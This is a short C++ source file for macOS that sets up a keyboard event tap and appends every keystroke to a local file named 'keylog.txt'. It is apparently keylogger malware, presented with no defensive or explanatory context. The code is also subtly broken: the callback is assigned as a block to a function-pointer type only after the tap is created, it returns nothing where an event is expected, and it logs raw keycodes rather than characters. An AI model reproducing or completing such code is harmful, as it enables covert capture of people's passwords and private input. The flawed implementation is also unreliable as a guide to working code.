#include <ApplicationServices/ApplicationServices.h>
#include <fstream>

using namespace std;

fstream logfile; 

CGEventTapCallBack keyDownCallback;

int main() {

  logfile.open("keylog.txt", fstream::out | fstream::app);

  CFRunLoopRef runLoop = CFRunLoopGetCurrent();
  
  CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
  CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, eventMask, keyDownCallback, NULL);

  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
  
  CFRunLoopAddSource(runLoop, runLoopSource, kCFRunLoopCommonModes);

  CFRelease(tap);
  CFRelease(runLoopSource);

  keyDownCallback = ^(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    
    if(type != kCGEventKeyDown) {
      return; 
    }

    UInt32 keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);  
    logfile << (char)keyCode;
    logfile.flush();
  };

  CFRunLoopRun();
  
  logfile.close();  
  
  return 0;
}